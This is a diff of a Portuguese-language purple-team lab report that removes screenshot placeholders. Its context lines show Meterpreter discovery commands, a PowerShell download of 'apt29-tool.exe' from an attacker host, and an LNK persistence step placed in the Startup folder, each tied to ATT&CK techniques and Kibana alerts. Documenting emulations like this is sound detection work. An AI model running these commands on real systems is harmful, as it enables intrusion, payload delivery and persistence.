@@ -197,8 +197,6 @@ net group "Domain Admins" /domain
 
 **Evidência:**
 
-> Adicionar print: output do net group na shell Meterpreter
-
 ![T1069 - Permission Groups](evidence/08-permission-groups.png)
 
 ---
@@ -218,8 +216,6 @@ Logon Server: \\WIN-DC01
 
 **Evidência:**
 
-> Adicionar print: output do systeminfo na shell Meterpreter
-
 ![T1082 - System Info](evidence/09-system-info.png)
 
 ---
@@ -232,8 +228,6 @@ tasklist
 
 **Evidência:**
 
-> Adicionar print: output do tasklist na shell Meterpreter
-
 ![T1057 - Process Discovery](evidence/10-process-discovery.png)
 
 ---
@@ -245,8 +239,6 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
 ```
 
 **Evidência:**
-
-> Adicionar print: output do reg query na shell Meterpreter
 
 ![T1012 - Registry Query](evidence/11-registry-query.png)
 
@@ -262,8 +254,6 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
 
 **Evidência:**
 
-> Adicionar print: comando 7z a executar na shell Meterpreter + ficheiro zip criado
-
 ![T1560 - Archive Data](evidence/12-archive-data.png)
 
 ---
@@ -275,8 +265,6 @@ Invoke-WebRequest -Uri "http://192.168.10.102:8080/apt29-tool.exe" -OutFile "C:\
 ```
 
 **Evidência:**
-
-> Adicionar print: alerta no Kibana do T1105 com o Invoke-WebRequest no commandLine
 
 ![T1105 - Tool Transfer](evidence/13-tool-transfer.png)
 
@@ -293,8 +281,6 @@ Copy-Item "C:\Users\Administrator\Downloads\ds7002\ds7002.lnk" "C:\Users\Adminis
 ```
 
 **Evidência:**
-
-> Adicionar print: ficheiro LNK na pasta Startup do WIN-DC01 + alerta no Kibana
 
 ![T1547.009 - Startup Persistence](evidence/14-startup-persistence.png)
 
